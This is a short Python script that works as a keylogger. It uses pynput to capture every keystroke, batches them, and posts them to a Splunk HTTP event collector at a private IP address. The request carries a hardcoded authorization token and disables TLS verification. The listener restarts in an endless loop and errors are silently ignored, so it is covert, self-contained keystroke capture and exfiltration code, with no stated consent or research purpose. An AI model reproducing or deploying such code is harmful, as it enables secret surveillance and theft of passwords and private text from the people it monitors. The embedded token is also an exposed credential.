# !/usr/bin/python

import aiohttp
import asyncio
from markupsafe import escape
from pynput import keyboard

recording = []
count = 0


async def post_request():
    global recording
    data = ''.join(recording)
    data = "{{\"event\":\"word={0}\"}}".format(data)
    url = "https://192.168.50.234:8088/+services/collector/event"
    headers = {'Authorization': 'Splunk 24FD4388-F0DC-4036-A058-146DC4FA637B'}
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        response = await session.post(
            url=url,
            data=data,
            headers=headers)


def get_key_code(key):
    if isinstance(key, keyboard.KeyCode):
        return f"{escape(key.char)}"
    else:
        return f" "


def on_press(key):
    global recording, count
    recording.append(get_key_code(key))
    count += 1
    if count > 50:
        try:
            asyncio.run(post_request())
            count = 0
            recording = []
        except:
            pass
    return False


def on_release(key):
    pass


def start_recording():
    keyboard_listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
    keyboard_listener.start()
    keyboard_listener.join()


while True:
    start_recording()
